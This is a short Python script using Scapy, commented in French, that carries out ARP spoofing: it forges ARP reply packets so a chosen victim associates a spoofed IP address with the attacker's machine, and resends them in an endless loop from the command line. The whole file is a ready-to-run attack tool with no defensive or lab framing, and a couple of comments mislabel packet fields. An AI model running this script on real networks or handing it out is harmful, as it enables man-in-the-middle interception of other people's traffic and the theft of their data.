from scapy.all import ARP, send
import argparse

def arp_spoof(victim_ip, spoof_ip, interface):
    """
    Réalise une attaque ARP spoofing :
    - Injecte une fausse association dans la table ARP de la victime.
    - Spoofe l'adresse IP spécifiée avec une fausse adresse MAC.
    """
    print(f"Lancement de l'attaque ARP spoofing : {victim_ip} pense que {spoof_ip} -> MAC de l'attaquant sur {interface}")

    # Construction du paquet ARP
    arp_packet = ARP(
        op=2,  # Requête ARP Reply
        pdst=victim_ip,  # IP de la victime
        hwdst="ff:ff:ff:ff:ff:ff",  # MAC de la victime (diffusion)
        psrc=spoof_ip  # IP à spoof
    )

    # Envoi continu pour maintenir la fausse entrée dans la table ARP
    try:
        while True:
            send(arp_packet, iface=interface, verbose=0)
            print(f"Paquet ARP envoyé : {victim_ip} pense que {spoof_ip} est ici")
    except KeyboardInterrupt:
        print("\nAttaque interrompue par l'utilisateur.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script d'ARP spoofing avec Scapy.")
    parser.add_argument("victim_ip", help="Adresse IP de la victime.")
    parser.add_argument("spoof_ip", help="Adresse IP à spoof.")
    parser.add_argument("interface", help="Interface réseau à utiliser.")
    args = parser.parse_args()

    arp_spoof(args.victim_ip, args.spoof_ip, args.interface)
